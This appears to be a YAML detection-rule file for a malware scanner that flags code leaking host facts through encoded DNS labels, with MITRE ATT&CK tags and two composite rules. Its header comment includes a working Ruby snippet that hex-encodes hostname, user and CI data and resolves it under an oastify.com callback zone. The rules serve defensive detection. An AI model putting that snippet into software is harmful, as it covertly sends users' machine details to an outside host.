# Host identity carried out as DNS labels.
#
# A package that cannot open an outbound socket -- or does not want one in a
# proxy log -- encodes what it learned about the machine into hex and resolves
# it as a subdomain. The authoritative server for that zone reads the query
# and never has to answer:
#
#     data = "#{hostname}.#{user}.#{ci}"
#     hex  = data.chars.map { |c| c.ord.to_s(16) }.join
#     hex.scan(/.{1,60}/).each_with_index { |l, i|
#       Resolv::DNS.new.getresource("#{l}.#{i}.pt.<id>.oastify.com", A) }
#
# The legs are a DNS lookup, a label that is a run of encoded bytes, and the
# host facts that went into it. Which resolver API and which collaborator
# service change per sample; that triple does not.
defaults:
  platforms: [unix, windows]
  for: [scripts, source]
  attack: T1071.004,T1041,T1082
  mbc: C0011

composite_rules:
  # The zone belongs to a known out-of-band callback service, so the lookup is
  # the exfiltration -- there is no application for that name to resolve.
  - id: oob-service-dns-host-recon
    for: [shell, python, javascript, rust, ruby, go, php, powershell]
    desc: Resolves host facts under an OOB callback zone
    crit: hostile
    conf: 0.96
    all:
      - id: micro-behaviors/communications/dns/lookup/query::source-resolver-query
      - id: objectives/exfiltration/oob/endpoint::oob-endpoint-any
    any:
      - id: micro-behaviors/os/sysinfo/hostname/
      - id: micro-behaviors/os/env/cicd/
    unless:
      # HTTP OOB beacons import `dns` and read `getServers()` for recon while
      # POSTing to the same collaborator hostname — not DNS-label exfil.
      - id: micro-behaviors/communications/dns/client::js-dns-get-servers
      - id: micro-behaviors/communications/http/request/configuration::node-http-request-configured-variable

  # The same shape against an attacker's own zone, where the service name is no
  # help: a long encoded third-level label is what the data looks like once it
  # has been chunked to fit.
  - id: encoded-label-dns-host-exfil
    desc: Sends host facts as encoded DNS labels
    crit: hostile
    conf: 0.94
    all:
      - id: micro-behaviors/communications/dns/lookup/query::source-resolver-query
      - id: metadata/file/string/domain::long-alphanumeric-third-level-label
    any:
      - id: micro-behaviors/os/sysinfo/hostname/
      - id: micro-behaviors/os/env/cicd/
    unless:
      - id: micro-behaviors/communications/dns/client::js-dns-get-servers
      - id: micro-behaviors/communications/http/request/configuration::node-http-request-configured-variable
